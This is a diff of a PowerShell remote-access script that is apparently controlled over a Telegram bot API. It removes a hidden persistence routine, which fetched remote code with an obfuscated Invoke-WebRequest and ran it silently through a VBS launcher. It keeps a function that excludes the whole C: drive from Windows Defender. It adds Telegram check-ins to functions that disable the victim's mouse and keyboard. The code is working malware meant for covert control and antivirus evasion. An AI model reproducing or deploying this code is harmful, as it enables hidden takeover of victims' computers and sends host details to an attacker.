@@ -453,24 +453,7 @@ Function Pause-Session{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
 Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
-$newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
-$scriptContent | Out-File -FilePath $newScriptPath -force
-if ($newScriptPath.Length -lt 100){
-    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
-    sleep 1
-    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
-    }
-$tobat = @'
-Set objShell = CreateObject("WScript.Shell")
-objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
-'@
-$pth = "$env:APPDATA\Microsoft\Windows\temp.vbs"
-$tobat | Out-File -FilePath $pth -Force
-sleep 2
-Start-Process -FilePath $pth
-rm -path "$env:TEMP\temp.ps1" -Force
-exit
+$script:AcceptedSession=""
 }
 
 Function Is-Admin{
@@ -527,24 +510,28 @@ Function Message([string]$Message){
 # ---------------------------------------- ADMIN ONLY FUNCTIONS --------------------------------------------------
 
 Function Disable-AV{
-Add-MpPreference -ExclusionPath C:\
-Write-Output "Done."
+    Add-MpPreference -ExclusionPath C:\
+    Write-Output "Done."
 }
 
 Function Disable-HID{
+    $contents = "$env:COMPUTERNAME $closed Disabling HID Inputs.."
+    $params = @{chat_id = $ChatID ;text = $contents}
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
     $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
     $PNPMice.Disable()
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
     $PNPKeyboard.Disable()
-    Write-Output "Done."
 }
 
 Function Enable-HID{
+    $contents = "$env:COMPUTERNAME $tick Enabling HID Inputs.."
+    $params = @{chat_id = $ChatID ;text = $contents}
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
     $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
     $PNPMice.Enable()
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
     $PNPKeyboard.Enable()
-    Write-Output "Done."
 }
 
 
